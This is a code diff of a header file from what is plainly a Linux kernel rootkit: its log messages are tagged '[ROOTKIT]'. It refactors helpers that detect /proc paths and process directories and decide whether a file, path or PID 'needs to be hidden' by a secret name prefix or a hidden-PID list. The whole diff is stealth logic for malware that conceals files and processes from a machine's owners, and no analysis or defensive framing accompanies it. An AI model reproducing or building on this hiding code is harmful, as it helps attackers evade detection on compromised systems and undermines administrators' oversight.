@@ -33,6 +33,21 @@ typedef struct dentry dentry_t;
 typedef struct files_struct files_t;
 
 /**
+ * Is the given path structure the root of a filesystem?
+ *
+ * @param p_path The path structure
+ * @return `true` if the given path structure is the root of a filesystem, `false` otherwise
+ */
+static inline bool is_path_root(const path_t *const p_path)
+{
+    IF_U (p_path == NULL) {
+        return false;
+    }
+
+    return IS_ROOT(p_path->dentry);
+}
+
+/**
  * Is the given file structure the root of a filesystem?
  *
  * @param p_file The file structure
@@ -44,7 +59,23 @@ static inline bool is_file_root(const file_t *const p_file)
         return false;
     }
 
-    return IS_ROOT(p_file->f_path.dentry);
+    return is_path_root(&p_file->f_path);
+}
+
+/**
+ * Is the given path structure in a `proc` filesystem?
+ *
+ * @param p_path The path structure
+ * @return `true` if the given path structure is in a proc filesystem, `false` otherwise
+ */
+static inline bool is_path_in_proc(const path_t *const p_path)
+{
+    IF_U (p_path == NULL || p_path->dentry == NULL || p_path->dentry->d_inode == NULL ||
+          p_path->dentry->d_inode->i_sb == NULL) {
+        return false;
+    }
+
+    return p_path->dentry->d_inode->i_sb->s_magic == PROC_SUPER_MAGIC;
 }
 
 /**
@@ -53,20 +84,28 @@ static inline bool is_file_root(const file_t *const p_file)
  * @param p_file The file structure
  * @return `true` if the given file structure is in a proc filesystem, `false` otherwise
  */
-static inline bool is_in_proc(const file_t *const p_file)
+static inline bool is_file_in_proc(const file_t *const p_file)
 {
-    const inode_t *p_inode = NULL; // Inode structure
-
     IF_U (p_file == NULL) {
         return false;
     }
 
-    p_inode = file_inode(p_file);
-    IF_U (p_inode == NULL) {
+    return is_path_in_proc(&p_file->f_path);
+}
+
+/**
+ * Is the given path structure the root of a `proc` filesystem?
+ *
+ * @param p_path The path structure
+ * @return `true` if the given path structure is the root of a proc filesystem, `false` otherwise
+ */
+static inline bool is_path_proc_root(const path_t *const p_path)
+{
+    IF_U (p_path == NULL) {
         return false;
     }
 
-    return p_inode->i_sb->s_magic == PROC_SUPER_MAGIC;
+    return is_path_root(p_path) && is_path_in_proc(p_path);
 }
 
 /**
@@ -75,13 +114,29 @@ static inline bool is_in_proc(const file_t *const p_file)
  * @param p_file The file structure
  * @return `true` if the given file structure is the root of a proc filesystem, `false` otherwise
  */
-static inline bool is_proc_root(const file_t *const p_file)
+static inline bool is_file_proc_root(const file_t *const p_file)
 {
     IF_U (p_file == NULL) {
         return false;
     }
 
-    return is_file_root(p_file) && is_in_proc(p_file);
+    return is_path_proc_root(&p_file->f_path);
+}
+
+/**
+ * Is the parent of the given path structure the root of a `proc` filesystem?
+ *
+ * @param p_path The path structure
+ * @return `true` if the parent of the given path structure is the root of a proc filesystem,
+ *         `false` otherwise
+ */
+static inline bool is_path_parent_proc_root(const path_t *const p_path)
+{
+    IF_U (p_path == NULL) {
+        return false;
+    }
+
+    return IS_ROOT(p_path->dentry->d_parent) && is_path_in_proc(p_path);
 }
 
 /**
@@ -91,17 +146,29 @@ static inline bool is_proc_root(const file_t *const p_file)
  * @return `true` if the parent of the given file structure is the root of a proc filesystem,
  *         `false` otherwise
  */
-static inline bool is_parent_proc_root(const file_t *const p_file)
+static inline bool is_file_parent_proc_root(const file_t *const p_file)
 {
-    const dentry_t *p_parent = NULL; // Parent dentry structure
-
     IF_U (p_file == NULL) {
         return false;
     }
 
-    p_parent = p_file->f_path.dentry->d_parent;
+    return is_path_parent_proc_root(&p_file->f_path);
+}
 
-    return IS_ROOT(p_parent) && is_in_proc(p_file);
+/**
+ * Is the given path structure a strict descendant of the root of a `proc` filesystem?
+ *
+ * @param p_path The path structure
+ * @return `true` if the given path structure is a strict descendant of the root of a proc
+ *         filesystem, `false` otherwise
+ */
+static inline bool is_path_proc_descendant(const path_t *const p_path)
+{
+    IF_U (p_path == NULL) {
+        return false;
+    }
+
+    return !is_path_root(p_path) && is_path_in_proc(p_path);
 }
 
 /**
@@ -111,14 +178,25 @@ static inline bool is_parent_proc_root(const file_t *const p_file)
  * @return `true` if the given file structure is a strict descendant of the root of a proc
  *         filesystem, `false` otherwise
  */
-static inline bool is_proc_descendant(const file_t *const p_file)
+static inline bool is_file_proc_descendant(const file_t *const p_file)
 {
     IF_U (p_file == NULL) {
         return false;
     }
 
-    return !is_file_root(p_file) && is_in_proc(p_file);
+    return is_path_proc_descendant(&p_file->f_path);
 }
+
+/**
+ * Is the given path structure a process file/dir?
+ *
+ * @param p_path   The path structure
+ * @param ps_name  (Optional) This gets set to the name of the first directory
+ *                 in the path after its root
+ * @param p_pid    This gets set to the corresponding PID, if the given path structure is a process
+ * @return `true` if the given path structure is a process file/dir, `false` otherwise
+ */
+bool is_process_path(const path_t *const p_path, const char **const ps_name, pid_t *p_pid);
 
 /**
  * Is the given file structure a process file?
@@ -129,29 +207,14 @@ static inline bool is_proc_descendant(const file_t *const p_file)
  * @param p_pid    This gets set to the corresponding PID, if the given file structure is a process
  * @return `true` if the given file structure is a process file, `false` otherwise
  */
-bool is_process_file(const file_t *const p_file, const char **const ps_name, pid_t *p_pid);
-
-/**
- * Is the given file structure /proc/<pid> or one of its descendants?
- *
- * @param p_file  The file structure
- * @param i32_pid The PID
- * @return `true` if the given file structure is a descendant of /proc/<pid>, `false` otherwise
- */
-static inline bool is_proc_pid_descendant(const file_t *const p_file, const pid_t i32_pid)
+static inline bool
+is_process_file(const file_t *const p_file, const char **const ps_name, pid_t *p_pid)
 {
-    pid_t i32_found_pid = -1; // PID of the process found in the path, if any
-
-    IF_U (i32_pid < 0) {
+    IF_U (p_file == NULL) {
         return false;
     }
 
-    if (!is_process_file(p_file, NULL, &i32_found_pid)) {
-        return false;
-    }
-
-    // Check if the parent directory is /proc/<pid>
-    return i32_found_pid == i32_pid;
+    return is_process_path(&p_file->f_path, ps_name, p_pid);
 }
 
 /**
@@ -205,6 +268,16 @@ static inline bool is_filename_or_pid_hidden(const char *const s_filename,
 }
 
 /**
+ * Does the given path need to be hidden?
+ * Checks if the path is a process file/dir and needs to be hidden,
+ * or if the file name starts with the hidden prefix.
+ *
+ * @param p_path The path structure to check
+ * @return `true` if the given path needs to be hidden, `false` otherwise
+ */
+bool is_path_hidden(const path_t *const p_path);
+
+/**
  * Does the given file need to be hidden?
  * Checks if the file is a process file and needs to be hidden,
  * or if the file name starts with the hidden prefix.
@@ -214,65 +287,67 @@ static inline bool is_filename_or_pid_hidden(const char *const s_filename,
  */
 static inline bool is_file_hidden(const file_t *const p_file)
 {
-    const dentry_t *p_parent = NULL; // dentry structure for parent directories
-    pid_t i32_found_pid      = -1;   // PID of the process found in the path, if any
-
     IF_U (p_file == NULL) {
         return false;
     }
 
-    IF_U (is_process_file(p_file, NULL, &i32_found_pid)) {
-        pr_info("[ROOTKIT] * This is a process file (PID: %d)\n", i32_found_pid);
-
-        // If the file is a process file, check if the process is hidden
-        return is_pid_hidden(i32_found_pid);
-    }
-    else {
-        pr_info("[ROOTKIT] * This is not a process file\n");
-    }
-
-    IF_U (is_filename_or_pid_hidden(p_file->f_path.dentry->d_name.name,
-                                    is_parent_proc_root(p_file))) {
-        return true;
-    }
-
-    // If the file is not a process file, check if one of its parents has a hidden name
-    p_parent = p_file->f_path.dentry->d_parent;
-    while (!IS_ROOT(p_parent)) {
-        if (is_filename_hidden(p_parent->d_name.name)) {
-            return true;
-        }
-
-        p_parent = p_parent->d_parent;
-    }
-
-    return false;
+    return is_path_hidden(&p_file->f_path);
 }
 
 /**
  * Gets the file structure associated with the given file descriptor.
  *
- * @param d_fd The file descriptor
+ * @param i32_fd The file descriptor
  * @return The file structure associated with the given file descriptor
  */
-const file_t *fd_get_file(const int d_fd);
+const file_t *fd_get_file(const int i32_fd);
 
 /**
- * Gets the pathname of the given file.
+ * Gets the pathname of the given path struct.
  * The returned string must be freed with `kfree`/`kvfree`.
  *
- * @param p_file The file
- * @return The pathname of the given file
+ * @param p_path The path struct
+ * @return The pathname of the given path struct
  */
-const char *file_get_pathname(const file_t *const p_file);
+const char *path_get_pathname(const path_t *const p_path);
+
+/**
+ * Gets the pathname of the given file struct.
+ * The returned string must be freed with `kfree`/`kvfree`.
+ *
+ * @param p_file The file struct
+ * @return The pathname of the given file struct
+ */
+static inline const char *file_get_pathname(const file_t *const p_file)
+{
+    const path_t *p_path = NULL; // Path structure
+
+    IF_U (p_file == NULL) {
+        return ERR_PTR(-EINVAL);
+    }
+
+    p_path = &p_file->f_path;
+
+    return path_get_pathname(p_path);
+}
 
 /**
  * Gets the pathname of the file associated with the given file descriptor.
  * The returned string must be freed with `kfree`/`kvfree`.
  *
- * @param d_fd The file descriptor
+ * @param i32_fd The file descriptor
  * @return The pathname of the file associated with the given file descriptor
  */
-const char *fd_get_pathname(const int d_fd);
+static inline const char *fd_get_pathname(const int i32_fd)
+{
+    const file_t *p_file = NULL; // File structure
+
+    p_file = fd_get_file(i32_fd);
+    IF_U (IS_ERR(p_file)) {
+        return (char *)p_file;
+    }
+
+    return file_get_pathname(p_file);
+}
 
 #endif
